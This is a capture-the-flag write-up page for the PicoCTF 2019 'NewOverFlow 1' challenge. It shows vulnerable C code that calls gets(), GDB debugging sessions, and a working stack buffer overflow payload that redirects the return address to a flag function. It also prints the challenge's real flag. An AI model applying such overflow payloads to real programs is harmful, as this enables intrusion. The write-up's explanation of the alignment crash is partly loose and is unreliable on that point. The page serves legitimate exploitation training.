@@ -1,0 +1,125 @@
+<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>PicoCTF19 NewOverFlow 1 - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel=stylesheet><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../";var default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"ayu":"ayu";</script><script>try{var theme=localStorage.getItem('mdbook-theme');var sidebar=localStorage.getItem('mdbook-sidebar');if(theme.startsWith('"')&&theme.endsWith('"')){localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1));}
+if(sidebar.startsWith('"')&&sidebar.endsWith('"')){localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1));}}catch(e){}</script><script>var theme;try{theme=localStorage.getItem('mdbook-theme');}catch(e){}
+if(theme===null||theme===undefined){theme=default_theme;}
+var html=document.querySelector('html');html.classList.remove('no-js')
+html.classList.remove('ayu')
+html.classList.add(theme);html.classList.add('js');</script><script>var html=document.querySelector('html');var sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar');}catch(e){}
+sidebar=sidebar||'visible';}
+html.classList.remove('sidebar-visible');html.classList.add("sidebar-"+sidebar);</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div id=sidebar-scrollbox class=sidebar-scrollbox><ol class=chapter><li class=expanded><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class=expanded><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class=expanded><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class=expanded><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class=expanded><a href=../../ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class=expanded><a href=../../ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class=expanded><a href=../../ctf/binary/picoctf19-overflow_1.html><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class=expanded><a href=../../ctf/binary/picoctf19-overflow_2.html><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class=expanded><a href=../../ctf/binary/picoctf19-new_overflow_1.html class=active><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a></ol><li class=expanded><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class=expanded><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class=expanded><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class=expanded><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class=expanded><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class=expanded><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class=expanded><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class=expanded><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class=expanded><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class=expanded><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class=expanded><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class=expanded><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class=expanded><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class=expanded><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class=expanded><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a></ol><li class=expanded><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class=expanded><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.1.</strong> PicoCTF19 Garden</a><li class=expanded><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Unzip</a><li class=expanded><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 So Meta</a><li class=expanded><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 Lies Within</a><li class=expanded><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Extensions</a><li class=expanded><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Shark Wire</a><li class=expanded><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 WhitePages</a><li class=expanded><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 like1000</a></ol><li class=expanded><a href=../../ctf/web/index.html><strong aria-hidden=true>3.4.</strong> Web</a><li><ol class=section><li class=expanded><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.4.1.</strong> SECCON19 Web Search</a><li class=expanded><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.4.2.</strong> TMCTF19F Container</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar class=menu-bar><div id=menu-bar-sticky-container><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
+<i class="fa fa-bars"></i></button>
+<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
+<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
+<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible');document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible');Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link){link.setAttribute('tabIndex',sidebar==='visible'?0:-1);});</script><div id=content class=content><main><h1><a class=header href=#picoctf19-newoverflow-1 id=picoctf19-newoverflow-1>PicoCTF19 NewOverFlow 1</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this <a href=https://2019shell1.picoctf.com/static/37a322b44b57810c3d9334d734bd394b/vuln>program</a>. You can find it in /problems/newoverflow-1 on the shell server. <a href=https://2019shell1.picoctf.com/static/37a322b44b57810c3d9334d734bd394b/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p>Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes<h2><a class=header href=#solution id=solution>Solution</a></h2><p>Let's take a look at the directory and copy the executable over to my home directory so I can debug it with GDB without any restrictions.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/newoverflow-1$ ls -al
+total 96
+drwxr-xr-x   2 root       root             4096 Sep 28 21:47 .
+drwxr-x--x 684 root       root            69632 Oct 10 18:02 ..
+-r--r-----   1 hacksports newoverflow-1_5    50 Sep 28 21:47 flag.txt
+-rwxr-sr-x   1 hacksports newoverflow-1_5  8728 Sep 28 21:47 vuln
+-rw-rw-r--   1 hacksports hacksports        628 Sep 28 21:47 vuln.c
+samson@pico-2019-shell1:/problems/newoverflow-1$ cat vuln.c 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFFSIZE 64
+#define FLAGSIZE 64
+
+void flag() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFFSIZE];
+  gets(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  puts(&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;);
+  vuln();
+  return 0;
+}
+
+samson@pico-2019-shell1:/problems/newoverflow-1$ cp vuln ~ &amp;&amp; pushd . &amp;&amp; cd ~
+samson@pico-2019-shell1:~$ nano flag.txt
+samson@pico-2019-shell1:~$ cat flag.txt 
+SAMCTF{NOT_THE_ACTUAL_FLAG}
+</code></pre><p>It seems like PicoCTF19 Overflow 1, but it doesn't print the last address it will try to access which in the case of the function <code>vuln()</code> will be a return address to <code>main()</code>.<pre><code class=language-bash>Welcome to 64-bit. Give me a string that gets you the flag: 
+A
+samson@pico-2019-shell1:~$ echo $(python -c &quot;print 'A'*68&quot;) | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag: 
+Segmentation fault (core dumped)
+</code></pre><p>Okay, no help here. So let's crash it with <code>gdb</code>.<pre><code class=language-bash>samson@pico-2019-shell1:~$ gdb ./vuln 
+... &lt;redacted&gt;
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+(gdb) x flag
+0x400767 &lt;flag&gt;:        0xe5894855
+(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4)')
+Starting program: /home/samson/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4)')
+Welcome to 64-bit. Give me a string that gets you the flag: 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004007e7 in vuln ()
+(gdb) x/g $sp
+0x7fffffffe468: 0x4545454544444444
+</code></pre><p>So it seems like we need to overwrite the 'C''s and 'D''s with the flag function address <code>0x400767</code>.<pre><code class=language-bash>(gdb)  r &lt; &lt;(python -c &quot;print('A'*72+'\x67\x07\x40'+'\x00'*5)&quot;)
+Starting program: /home/samson/vuln &lt; &lt;(python -c &quot;print('A'*72+'\x67\x07\x40'+'\x00'*5)&quot;)
+Welcome to 64-bit. Give me a string that gets you the flag: 
+
+Program received signal SIGSEGV, Segmentation fault.
+buffered_vfprintf (s=s@entry=0x7ffff7dd0760 &lt;_IO_2_1_stdout_&gt;, format=format@entry=0x7fffffffe418 &quot;SAMCTF{NOT_THE_ACTUAL_FLAG}\n&quot;, args=args@entry=0x7fffffffe338) at vfprintf.c:2314
+2314    vfprintf.c: No such file or directory.
+</code></pre><p>Interesting. An error in GDB. What's the program counter register at?<pre><code class=language-bash>(gdb) x/i $pc
+=&gt; 0x7ffff7a4266e &lt;buffered_vfprintf+158&gt;:      movaps %xmm0,0x50(%rsp)
+</code></pre><p>What's that <code>movaps</code> instruction? I've literally never seen that before?
+I'll spare you the search results but basically this error is due to the program causing the kernel to jump to the address <code>0x400767</code> which is not a valid jump address in <code>x64</code>. Otherwise known as a alignment violation. In order to jump properly, I need to jump to an address which is a multiple of 16.<pre><code class=language-bash>(gdb) disas flag
+Dump of assembler code for function flag:
+   0x0000000000400767 &lt;+0&gt;:     push   %rbp
+   0x0000000000400768 &lt;+1&gt;:     mov    %rsp,%rbp
+   0x000000000040076b &lt;+4&gt;:     sub    $0x50,%rsp
+   0x000000000040076f &lt;+8&gt;:     lea    0x172(%rip),%rsi        # 0x4008e8
+   0x0000000000400776 &lt;+15&gt;:    lea    0x16d(%rip),%rdi        # 0x4008ea
+   0x000000000040077d &lt;+22&gt;:    callq  0x400660 &lt;fopen@plt&gt;
+   0x0000000000400782 &lt;+27&gt;:    mov    %rax,-0x8(%rbp)
+   0x0000000000400786 &lt;+31&gt;:    cmpq   $0x0,-0x8(%rbp)
+   0x000000000040078b &lt;+36&gt;:    jne    0x4007a3 &lt;flag+60&gt;
+   0x000000000040078d &lt;+38&gt;:    lea    0x164(%rip),%rdi        # 0x4008f8
+   0x0000000000400794 &lt;+45&gt;:    callq  0x4005f0 &lt;puts@plt&gt;
+   0x0000000000400799 &lt;+50&gt;:    mov    $0x0,%edi
+   0x000000000040079e &lt;+55&gt;:    callq  0x400670 &lt;exit@plt&gt;
+   0x00000000004007a3 &lt;+60&gt;:    mov    -0x8(%rbp),%rdx
+   0x00000000004007a7 &lt;+64&gt;:    lea    -0x50(%rbp),%rax
+   0x00000000004007ab &lt;+68&gt;:    mov    $0x40,%esi
+   0x00000000004007b0 &lt;+73&gt;:    mov    %rax,%rdi
+   0x00000000004007b3 &lt;+76&gt;:    callq  0x400620 &lt;fgets@plt&gt;
+   0x00000000004007b8 &lt;+81&gt;:    lea    -0x50(%rbp),%rax
+   0x00000000004007bc &lt;+85&gt;:    mov    %rax,%rdi
+   0x00000000004007bf &lt;+88&gt;:    mov    $0x0,%eax
+   0x00000000004007c4 &lt;+93&gt;:    callq  0x400610 &lt;printf@plt&gt;
+   0x00000000004007c9 &lt;+98&gt;:    nop
+   0x00000000004007ca &lt;+99&gt;:    leaveq 
+   0x00000000004007cb &lt;+100&gt;:   retq   
+End of assembler dump.
+</code></pre><p>Well it looks like the first instruction is most likely just pushing the return address on the stack so the program can return to the <code>main()</code> function after completing flag. The next instruction seems like it is probably related to the <code>flag()</code> function and is a multiple of 16 in hex. So let's try jumping to that address instead.<pre><code class=language-bash>samson@pico-2019-shell1:~$ python -c &quot;print('A'*72+'\x68\x07\x40'+'\x00'*5)&quot; | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag: 
+SAMCTF{NOT_THE_ACTUAL_FLAG}
+Segmentation fault (core dumped)
+samson@pico-2019-shell1:~$ popd &amp;&amp; python -c &quot;print('A'*72+'\x68\x07\x40'+'\x00'*5)&quot; | ./vuln
+/problems/newoverflow-1 /problems/newoverflow-1
+Welcome to 64-bit. Give me a string that gets you the flag: 
+picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}
+Segmentation fault (core dumped)
+</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_2.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/crypto/index.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/picoctf19-overflow_2.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/crypto/index.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
